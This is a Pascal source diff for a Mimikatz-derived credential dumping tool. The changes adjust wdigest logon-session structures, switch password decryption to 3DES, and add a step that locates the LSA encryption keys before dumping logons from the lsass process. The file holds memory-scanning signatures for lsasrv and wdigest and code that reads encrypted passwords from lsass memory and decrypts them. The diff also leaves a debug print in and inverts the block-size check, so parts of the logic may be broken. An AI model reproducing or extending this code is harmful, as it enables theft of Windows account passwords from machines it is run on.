@@ -16,10 +16,19 @@ type i_logsesslist=record
      this:nativeuint;
      luid:nativeuint;
      unk1:nativeuint;
-     unk2:nativeuint;
+     //unk2:nativeuint;
+     len1:word;
+     maxlen1:word;
+     unk2:dword;
      usernameptr:nativeuint;
-     minmax:nativeuint;
+     //minmax:nativeuint;
+     len2:word;
+     maxlen2:word;
+     unk3:dword;
      domainptr:nativeuint;
+     len3:word;
+     maxlen3:word;
+     unk4:dword;
      passwordptr:nativeuint; //??
      end;
   {$endif CPU64}
@@ -36,16 +45,16 @@ type i_logsesslist=record
        unk2:nativeuint;
        unk3:nativeuint;
        //minmax1:nativeuint;
-       min1:word;
-       max1:word;
+       len1:word;
+       maxlen1:word;
        usernameptr:nativeuint;
        //minmax2:nativeuint;
-       min2:word;
-       max2:word;
+       len2:word;
+       maxlen2:word;
        domainptr:nativeuint;
        //minmax3:nativeuint;
-       min3:word;
-       max3:word;
+       len3:word;
+       maxlen3:word;
        passwordptr:nativeuint; //??
        end;
     {$endif CPU32}
@@ -118,26 +127,26 @@ var
 function decryptLSA(cbmemory:ulong;encrypted:array of byte):boolean;
 const
   BCRYPT_AES_ALGORITHM                    = 'AES';
-  BCRYPT_DES_ALGORITHM                    = 'DES';
+  BCRYPT_3DES_ALGORITHM                   = '3DES';
 var
   cbIV:ulong;
   status:ntstatus;
 begin
-  if (cbMemory mod 8)=0 then     //multiple of 8
+  writeln(cbMemory mod 8);
+  if (cbMemory mod 8)<>0 then     //multiple of 8
 	begin
 		//hKey = &kAes.hKey;
 		cbIV := sizeof(iv);
-                status:=bdecrypt(BCRYPT_AES_ALGORITHM,@encrypted,cbmemory ,@aeskey[0],@iv[0]);
-                log('aes status:'+inttohex (status,sizeof(status)));
-                log('aes decrypted:'+HashByteToString (encrypted));
+                log('aes encrypted:'+HashByteToString (encrypted));
+                status:=bdecrypt(BCRYPT_AES_ALGORITHM,encrypted,cbmemory ,aeskey,iv);
+
         end
 	else
 	begin
 		//hKey = &k3Des.hKey;
 		cbIV := sizeof(iv) div 2;
-                status:=bdecrypt(BCRYPT_DES_ALGORITHM,@encrypted,cbmemory ,@deskey[0],@iv[0]);
-                log('des status:'+inttohex (status,sizeof(status)));
-                log('des decrypted:'+HashByteToString (encrypted));
+                log('des encrypted:'+HashByteToString (encrypted));
+                status:=bdecrypt(BCRYPT_3DES_ALGORITHM,encrypted,cbmemory ,deskey,iv);
         end;
 
 end;
@@ -571,11 +580,13 @@ end;
 //check kuhl_m_sekurlsa_utils.c
 function dumplogons(pid:dword;module:string):boolean;
 const
+  //dd Lsasrv!LogonSessionList in windbg
   WN1703_LogonSessionList:array [0..11] of byte= ($33, $ff, $45, $89, $37, $48, $8b, $f3, $45, $85, $c9, $74);
   WNBLUE_LogonSessionList:array [0..12] of byte=($8b, $de, $48, $8d, $0c, $5b, $48, $c1, $e1, $05, $48, $8d, $05);
   after:array[0..1] of byte=($eb,$04);
   //after:array[0..1] of byte=($0F,$84);
   // Signature used to find l_LogSessList (PTRN_WIN6_PasswdSet from Mimikatz)
+  //dd wdigest!l_LogSessList in windbg
   PTRN_WIN5_PasswdSet:array [0..3] of byte=  ($48, $3b, $da, $74);
   PTRN_WIN6_PasswdSet:array [0..3] of byte=  ($48, $3b, $d9, $74);
   //x86
@@ -714,13 +725,13 @@ begin
                                    ReadMem  (hprocess,i_logsesslist (logsesslist ).usernameptr,bytes );
                                    copymemory(@username[0],@bytes[0],64);
                                    log('username:'+widestring(username));
-                                   log('pwdlen:'+inttostr(i_logsesslist (logsesslist ).min3)) ;
-                                   if i_logsesslist (logsesslist ).min3>0 then
+                                   log('pwdlen:'+inttostr(i_logsesslist (logsesslist ).maxlen3)) ;
+                                   if i_logsesslist (logsesslist ).maxlen3>0 then
                                      begin
-                                     setlength(password,i_logsesslist (logsesslist ).min3);
-                                     ReadMem  (hprocess,i_logsesslist (logsesslist ).passwordptr ,@password[0],i_logsesslist (logsesslist ).min3 );
-                                     log('encrypted password:'+HashByteToString (password));
-                                     decryptLSA (i_logsesslist (logsesslist ).min3,password);
+                                     setlength(password,i_logsesslist (logsesslist ).maxlen3);
+                                     ReadMem  (hprocess,i_logsesslist (logsesslist ).passwordptr ,@password[0],i_logsesslist (logsesslist ).maxlen3 );
+                                     //log('encrypted password:'+HashByteToString (password));
+                                     decryptLSA (i_logsesslist (logsesslist ).maxlen3,password);
                                      end;
                                    //decryptcreds;
                                    //next
@@ -891,6 +902,7 @@ begin
   p:=pos('/dumplogons',cmdline);
   if p>0 then
      begin
+     findlsakeys (lsass_pid,deskey,aeskey,iv );
      dumplogons (lsass_pid,'wdigest.dll');
      exit;
      end;
